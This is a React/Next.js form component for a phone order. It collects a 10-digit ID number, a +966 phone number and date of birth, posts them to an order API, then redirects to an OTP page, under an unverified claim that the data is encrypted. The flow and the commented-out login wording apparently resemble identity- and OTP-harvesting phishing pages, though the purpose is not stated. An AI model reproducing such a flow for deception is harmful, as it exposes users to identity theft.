// import { FaArrowRightLong } from "react-icons/fa6";
// import { useRouter, useSearchParams } from "next/navigation";
// import "react-phone-number-input/style.css";
// // import PhoneInput from "react-phone-number-input";
// import toast from "react-hot-toast";
// import SwiperSlider from "@/components/SwiperSlider";
// import { Button } from "@nextui-org/react";
// import { useState } from "react";
// // import PhoneInput from 'react-phone-number-input';
// import "react-phone-number-input/style.css";

// const UserInfo = () => {
//   const router = useRouter();
//   const searchParams = useSearchParams();
//   const params = new URLSearchParams(searchParams);
//   const [userName, setUserName] = useState("");
//   const [isFormSubmit, setIsFormSubmit] = useState(false);
//   // const [value, setValue] = useState("+966");

//   // // Create a custom input component with forwardRef and assign a display name
//   // const CustomInput = forwardRef(({ ...props }, ref) => (
//   //   <input
//   //     ref={ref}
//   //     {...props}
//   //     className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
//   //   />
//   // ));

//   // // Assign a display name to the custom input component
//   // CustomInput.displayName = "CustomInput";

//   const handleSubmit = (event) => {
//     event.preventDefault();
//     setIsFormSubmit(true);
//     if (userName.length !== 10) return;

//     const submitData = {
//       identity: event.target.identity.value,
//       password: "n/a",
//       phone: event.target.phone.value,
//       model: params.get("model"),
//       color: params.get("color"),
//       storage: params.get("storage"),
//       nationality: params.get("nationality"),
//       dob: params.get("dob"),
//     };
//     if (submitData.identity === "") {
//       toast.error("Please enter your identity");
//     } else if (submitData.phone === "") {
//       toast.error("Please enter your phone number");
//     } else if (submitData.email === "") {
//       toast.error("Please enter your email");
//     } else if (submitData.model === "") {
//       toast.error("Please enter your model");
//     } else if (submitData.color === "") {
//       toast.error("Please enter your color");
//     } else if (submitData.storage === "") {
//       toast.error("Please enter your storage");
//     } else if (submitData.nationality === "") {
//       toast.error("Please enter your nationality");
//     } else if (submitData.dob === "") {
//       toast.error("Please enter your date of birth");
//     } else {
//       // router.push('/first-otp')
//       fetch(`${process.env.API_URL}/api/order`, {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify(submitData),
//       })
//         .then((res) => res.json())
//         .then((data) => {
//           if (data) {
//             toast.success("Your user details has been uploaded successfully!");
//             router.push({
//               pathname: "/first-otp",
//               query: { id: data._id },
//             });
//           } else {
//             toast.error("Sorry, we couldn't process your request!");
//           }
//         })
//         .catch((err) => {
//           toast.error(err.message);
//         });
//     }
//   };

//   return (
//     <>
//       <SwiperSlider />
//       <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
//         <h1 className="text-4xl font-bold text-gray-600 mt-10">User Info</h1>
//         <form onSubmit={handleSubmit} className="w-3/4 my-14">
//           <div className="mb-6">
//             <div className="relative z-0 w-full group">
//               <input
//                 type="number"
//                 name="identity"
//                 id="identity"
//                 onChange={(e) => setUserName(e.target.value)}
//                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
//                 placeholder=""
//                 required
//               />
//               <label
//                 htmlFor="identity"
//                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
//               >
//                 Username or ID Number
//               </label>
//             </div>
//             {userName.length !== 10 &&
//               userName.length !== 0 &&
//               isFormSubmit && (
//                 <p
//                   style={{ color: "red" }}
//                   className="text-sm font-medium pt-1"
//                 >
//                   User ID Number must be exactly 10 digits
//                 </p>
//               )}
//             {userName.length === 0 && isFormSubmit && (
//               <p style={{ color: "red" }} className="text-sm font-medium pt-1">
//                 User ID Number is required
//               </p>
//             )}
//           </div>
//           {/* <div className="grid md:grid-cols-2 md:gap-6"> */}
//           {/* <div className="relative z-0 w-full mb-6 group">
//               <input
//                 type="text"
//                 name="password"
//                 id="password"
//                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
//                 placeholder=""
//                 required
//               />
//               <label
//                 htmlFor="password"
//                 className="z-10 peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
//               >
//                 Password
//               </label>
//             </div> */}
//           <div>
//             {/* <PhoneInput
//               placeholder="Enter phone number"
//               value={value}
//               onChange={setValue}
//             /> */}
//             <div className="relative z-0 w-full mb-6 group">
//               <input
//                 type="tel"
//                 // pattern="[0-9]{3}-[0-9]{2}-[0-9]{3}"
//                 name="phone"
//                 id="phone"
//                 defaultValue="+966"
//                 className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
//                 placeholder=" "
//                 required
//               />
//               <label
//                 htmlFor="phone"
//                 className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
//               >
//                 Phone number
//               </label>
//             </div>
//           </div>
//           {/* <div className="relative z-0 w-full mb-6 group">
//             <PhoneInput
//               placeholder="Enter phone number"
//               value={value}
//               onChange={(e) => setValue(e.target.value)}
//               defaultCountry="SA"
//               inputComponent={CustomInput} // Pass the custom input component
//             />
//             <label
//               htmlFor="phone"
//               className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
//             >
//               Phone number
//             </label>
//           </div> */}
//           {/* </div> */}
//           {/* <button
//             type="submit"
//             className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
//           >
//             LOG IN <FaArrowRightLong size={16} />
//           </button> */}
//           <Button
//             color="primary"
//             type="submit"
//             className={`w-full text-white h-12 bg-[#0D9488]`}
//           >
//             LOG IN <FaArrowRightLong size={16} />
//           </Button>
//         </form>
//       </div>
//       <div className="h-20 bg-teal-400 mt-5"></div>
//     </>
//   );
// };

// export default UserInfo;

import { useState } from "react";
import { FaArrowRight, FaUser, FaPhone, FaShieldAlt } from "react-icons/fa";
import { HiSparkles } from "react-icons/hi";
import { useSearchParams, useRouter } from "next/navigation";
import toast from "react-hot-toast";

export default function ModernUserInfo() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [userName, setUserName] = useState("");
  const [phone, setPhone] = useState("+966");
  const [isFormSubmit, setIsFormSubmit] = useState(false);

  // Get params from URL
  const params = {
    model: searchParams.get("model") || "",
    color: searchParams.get("color") || "",
    storage: searchParams.get("storage") || "",
    nationality: searchParams.get("nationality") || "",
    dob: searchParams.get("dob") || "",
  };

  const handleSubmit = () => {
    setIsFormSubmit(true);

    // Validation checks
    if (!userName || userName.length === 0) {
      toast.error("Please enter your identity");
      return;
    }

    if (userName.length !== 10) {
      toast.error("User ID Number must be exactly 10 digits");
      return;
    }

    if (!phone || phone === "+966" || phone.length < 5) {
      toast.error("Please enter your phone number");
      return;
    }

    if (!params.model || params.model === "") {
      toast.error("Please select your model");
      return;
    }

    if (!params.color || params.color === "") {
      toast.error("Please select your color");
      return;
    }

    if (!params.storage || params.storage === "") {
      toast.error("Please select your storage");
      return;
    }

    if (!params.nationality || params.nationality === "") {
      toast.error("Please select your nationality");
      return;
    }

    if (!params.dob || params.dob === "") {
      toast.error("Please enter your date of birth");
      return;
    }

    const submitData = {
      identity: userName,
      password: "n/a",
      phone: phone,
      model: params.model,
      color: params.color,
      storage: params.storage,
      nationality: params.nationality,
      dob: params.dob,
    };

    // API call with toast
    toast.promise(
      fetch(`${process.env.API_URL || ""}/api/order`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => {
          if (!res.ok) {
            throw new Error("Network response was not ok");
          }
          return res.json();
        })
        .then((data) => {
          if (data && data._id) {
            setTimeout(() => {
              router.push(`/first-otp?id=${data._id}`);
            }, 1000);
            return data;
          } else {
            throw new Error("Invalid response from server");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
          throw error;
        }),
      {
        loading: "Submitting your information...",
        success: "User details uploaded successfully! Redirecting...",
        error: "Sorry, we couldn't process your request!",
      }
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      {/* Hero Section */}
      <div className="relative overflow-hidden bg-gradient-to-r from-teal-900/20 to-cyan-900/20 border-b border-slate-800">
        <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1551650975-87deedd944c3?w=1200&auto=format&fit=crop')] opacity-5 bg-cover bg-center"></div>
        <div className="relative max-w-7xl mx-auto px-4 py-16 text-center">
          <div className="inline-flex items-center gap-2 px-4 py-2 bg-white/10 backdrop-blur-md rounded-full mb-4 border border-white/20">
            <HiSparkles className="w-4 h-4 text-teal-400" />
            <span className="text-sm text-white font-medium">Almost There</span>
          </div>
          <h1 className="text-4xl md:text-6xl font-bold text-white mb-4 tracking-tight">
            Complete Your{" "}
            <span className="bg-gradient-to-r from-teal-400 to-cyan-400 bg-clip-text text-transparent">
              Profile
            </span>
          </h1>
          <p className="text-gray-300 text-lg max-w-2xl mx-auto">
            Just add your ID and Phone number to secure your order
          </p>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-4xl mx-auto px-4 py-16">
        <div className="grid lg:grid-cols-2 gap-8">
          {/* Order Summary Card */}
          <div className="space-y-6">
            <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 border border-slate-800">
              <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-2">
                <FaShieldAlt className="text-teal-400" />
                Order Summary
              </h2>

              <div className="space-y-4">
                <div className="flex justify-between items-center p-4 bg-slate-800/50 rounded-xl">
                  <span className="text-gray-400">Model</span>
                  <span className="text-white font-semibold">
                    {params.model}
                  </span>
                </div>

                <div className="flex justify-between items-center p-4 bg-slate-800/50 rounded-xl">
                  <span className="text-gray-400">Storage</span>
                  <span className="text-white font-semibold">
                    {params.storage}
                  </span>
                </div>

                <div className="flex justify-between items-center p-4 bg-slate-800/50 rounded-xl">
                  <span className="text-gray-400">Color</span>
                  <div className="flex items-center gap-2">
                    <div
                      className="w-6 h-6 rounded-full border-2 border-white/30"
                      style={{ backgroundColor: params.color }}
                    ></div>
                    <span className="text-white font-semibold">Selected</span>
                  </div>
                </div>

                <div className="flex justify-between items-center p-4 bg-slate-800/50 rounded-xl">
                  <span className="text-gray-400">Country</span>
                  <span className="text-white font-semibold">
                    {params.nationality}
                  </span>
                </div>
              </div>

              <div className="mt-6 p-4 bg-gradient-to-r from-teal-500/10 to-cyan-500/10 rounded-xl border border-teal-500/20">
                <p className="text-sm text-gray-300 text-center">
                  🔒 Your information is secure and encrypted
                </p>
              </div>
            </div>
          </div>

          {/* Form Card */}
          <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 border border-slate-800">
            <h2 className="text-2xl font-bold text-white mb-6">
              User Information
            </h2>

            <div className="space-y-6">
              {/* Username/ID Field */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-300 flex items-center gap-2">
                  <FaUser className="text-teal-400" />
                  Username or ID Number
                </label>
                <div className="relative">
                  <input
                    type="number"
                    name="identity"
                    value={userName}
                    onChange={(e) => setUserName(e.target.value)}
                    className="w-full px-4 py-3 bg-slate-800/50 border border-slate-700 rounded-xl text-white focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all placeholder-gray-500"
                    placeholder="Enter 10-digit ID number"
                  />
                </div>
                {userName.length !== 10 &&
                  userName.length !== 0 &&
                  isFormSubmit && (
                    <p className="text-sm text-red-400 flex items-center gap-1">
                      ⚠️ User ID Number must be exactly 10 digits
                    </p>
                  )}
                {userName.length === 0 && isFormSubmit && (
                  <p className="text-sm text-red-400 flex items-center gap-1">
                    ⚠️ User ID Number is required
                  </p>
                )}
              </div>

              {/* Phone Field */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-300 flex items-center gap-2">
                  <FaPhone className="text-teal-400" />
                  Phone Number
                </label>
                <div className="relative">
                  <input
                    type="tel"
                    name="phone"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="w-full px-4 py-3 bg-slate-800/50 border border-slate-700 rounded-xl text-white focus:ring-2 focus:ring-teal-500 focus:border-transparent outline-none transition-all placeholder-gray-500"
                    placeholder="+966 5X XXX XXXX"
                  />
                </div>
                <p className="text-xs text-gray-500">
                  Include country code (e.g., +966)
                </p>
              </div>

              {/* Info Box */}
              <div className="p-4 bg-slate-800/30 rounded-xl border border-slate-700">
                <p className="text-sm text-gray-400">
                  <strong className="text-teal-400">Note:</strong> Please ensure
                  your ID number is correct as it will be used for verification
                  purposes.
                </p>
              </div>

              {/* Submit Button */}
              <button
                onClick={handleSubmit}
                className="w-full py-4 bg-gradient-to-r from-teal-500 to-cyan-500 text-white rounded-xl font-semibold hover:shadow-2xl hover:shadow-teal-500/50 transition-all duration-300 flex items-center justify-center gap-2 group"
              >
                Continue to Verification
                <FaArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
